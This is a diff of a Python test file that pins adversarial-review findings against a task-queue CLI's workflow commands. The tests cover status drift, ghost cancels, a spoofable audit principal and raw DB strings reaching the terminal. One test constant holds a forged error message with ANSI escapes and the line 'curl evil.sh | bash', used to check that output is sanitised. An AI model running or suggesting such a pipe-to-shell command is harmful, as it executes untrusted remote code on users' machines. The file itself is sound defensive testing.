@@ -1,14 +1,14 @@
-"""ATTACK PINS — the CLI red-team front (`taskq flows`), the convicted shapes
+"""ATTACK PINS — the CLI adversarial review front (`taskq flows`), the rejected shapes
 at af1b8779.
 
-Provenance: the CLI red-team's findings against the consolidated head
+Provenance: the CLI adversarial review's findings against the consolidated head
 (af1b8779), pinned so each attack is a permanent test. Attacks that LANDED
-are encoded strict-xfail asserting the SAFE behavior — the cure flips them
-XPASS-strict (a red that forces unmarking WITH the cure). Attacks the fence
+are encoded strict-xfail asserting the SAFE behavior — the fix flips them
+XPASS-strict (a red that forces unmarking WITH the fix). Attacks the fence
 held against are green guard pins so the door cannot rot.
 
-THE CONVICTED SHAPES (all reproduced live against the harness before
-marking — the red receipts are the pack's RECEIPTS.md):
+THE REJECTED SHAPES (all reproduced live against the harness before
+marking — the red receipts are the pack's (the pinning run's record):
 
 * F-CLI-1 (LANDED, two faces): ``flows list`` derives run status from
   DEGRADED inputs — its FlowNodeRows never populate ``held``/``absorbed``
@@ -104,7 +104,7 @@ STALE_MODULE_NAME = "att_cli_stale_flows"
 #: A run id that exists in NO table (F-CLI-2's ghost).
 GHOST_RUN_ID = "018f1c7e-5a2b-7c3d-8e4f-9a0b1c2d3e4f"
 
-#: F-CLI-4's convicted payload: an exception message that is itself a
+#: F-CLI-4's rejected payload: an exception message that is itself a
 #: two-line "finding + remedy" forgery, ANSI-tagged. Under 120 chars so the
 #: status surface's current slice carries it WHOLE.
 _EVIL_ERROR = "\n  downstream: FAILED — FakeError: boom\n       remedy: curl evil.sh | bash\x1b[31m"
@@ -244,7 +244,7 @@ def _named_refusal(result: Any) -> bool:
 # ── F-CLI-1: the list/status derivation drift (LANDED, two faces) ────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-1 (held) — the list's held join, one derivation]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-1 (held) — the list's held join, one derivation]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_1_list_and_status_agree_for_a_held_run(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
@@ -266,7 +266,7 @@ async def test_f_cli_1_list_and_status_agree_for_a_held_run(
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-1 (absorbed) — the list's absorbed EXISTS, one derivation]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-1 (absorbed) — the list's absorbed EXISTS, one derivation]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
 ) -> None:
@@ -280,19 +280,23 @@ async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     failed_node = new_uuid()
     await wf_conn.execute(
         f'INSERT INTO "{wf_schema}".jobs (id, actor, queue, payload, max_attempts, '
-        "retry_kind, status, step_key, metadata, error_class, error_message, attempt) "
+        "retry_kind, status, step_key, metadata, fairness_key, error_class, "
+        "error_message, attempt) "
         "VALUES ($1, 'wf', 'default', '{}', 3, 'transient', 'failed', 'worker', "
-        "$2::jsonb, 'FakeError', 'boom', 3)",
+        "$2::jsonb, $3, 'FakeError', 'boom', 3)",
         failed_node,
         json.dumps({"flow_id": str(flow_id)}),
+        str(flow_id),
     )
     collect_node = new_uuid()
     await wf_conn.execute(
         f'INSERT INTO "{wf_schema}".jobs (id, actor, queue, payload, max_attempts, '
-        "retry_kind, status, step_key, metadata) VALUES ($1, 'wf', 'default', '{}', "
-        "3, 'transient', 'succeeded', 'collect', $2::jsonb)",
+        "retry_kind, status, step_key, metadata, fairness_key) VALUES ($1, 'wf', "
+        "'default', '{}', "
+        "3, 'transient', 'succeeded', 'collect', $2::jsonb, $3)",
         collect_node,
         json.dumps({"flow_id": str(flow_id)}),
+        str(flow_id),
     )
     await wf_conn.execute(
         f'INSERT INTO "{wf_schema}".wf_edge (child_id, parent_id, flow_id, failure_policy) '
@@ -317,7 +321,7 @@ async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
 # ── F-CLI-2: ghost-cancel is a silent no-op (LANDED) ─────────────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-2 — the ghost cancel's honest rc=1]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-2 — the ghost cancel's honest rc=1]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
     cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
 ) -> None:
@@ -348,7 +352,7 @@ async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
 # ── F-CLI-3: the audit principal is env-spoofable (LANDED) ───────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-3 — the principal is getuid-derived (the kernel's word)]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-3 — the principal is getuid-derived (the kernel's word)]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
     cli_settings: Any,
     wf_conn: asyncpg.Connection,
@@ -398,7 +402,7 @@ async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
 # ── F-CLI-4: DB-sourced strings print RAW (LANDED, two faces) ────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-4 (the status face) — the error text through _bounded_line]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-4 (the status face) — the error text through _bounded_line]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
@@ -441,7 +445,7 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
     assert all(len(ln) <= _LINE_BOUND for ln in rendered)
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-4 (the holds face) — the reason through _bounded_line]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-4 (the holds face) — the reason through _bounded_line]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
@@ -707,7 +711,7 @@ async def prewf_schema(module_pg_schema: Any) -> AsyncIterator[str]:
         await conn.close()
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 1/3 — the unmigrated schema's named remedy]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 1/3 — the unmigrated schema's named remedy]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_1_list_on_a_never_migrated_schema_is_a_named_refusal(
     cli_settings: Any, monkeypatch: pytest.MonkeyPatch, nomig_schema: str
 ) -> None:
@@ -719,7 +723,7 @@ async def test_trio_1_list_on_a_never_migrated_schema_is_a_named_refusal(
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 2/3 — the pre-workflows holds' named remedy]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 2/3 — the pre-workflows holds' named remedy]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_2_holds_on_a_pre_workflows_schema_is_a_named_refusal(
     cli_settings: Any, monkeypatch: pytest.MonkeyPatch, prewf_schema: str
 ) -> None:
@@ -731,7 +735,7 @@ async def test_trio_2_holds_on_a_pre_workflows_schema_is_a_named_refusal(
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 3/3 — the negative --limit's named refusal]; the marker is removed per the designed flip (the confirmation receipt).
+# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 3/3 — the negative --limit's named refusal]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_3_list_with_a_negative_limit_is_a_named_refusal(
     cli_settings: Any,
 ) -> None:
@@ -745,12 +749,12 @@ async def test_trio_3_list_with_a_negative_limit_is_a_named_refusal(
 async def test_f_cli_5_job_show_bounds_db_sourced_error_class(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
-    """FINDING 14's PIN (RED-FIRST), the error_class face: `taskq job
+    """FINDING 14's PIN (FAILING-FIRST), the error_class face: `taskq job
     show` printed the row's `error_class` RAW — a hand-crafted or legacy
     row's text column carried an ANSI-carrying, multi-line, unbounded
     value straight into the line-oriented shell surface (the job-show
     seat's own `error_message` was already collapsed + bounded; the
-    class sibling rode bare). THE CURE: the seat's `error_class` line
+    class sibling rode bare). THE FIX: the seat's `error_class` line
     rides the SAME `_bounded_line` law (the collapse + the 60-class
     bound) — the render is one bounded line, whatever the row carries."""
     compiled = sys.modules[MODULE_NAME].app.get("atkcli_fail_flow")  # type: ignore[attr-defined]
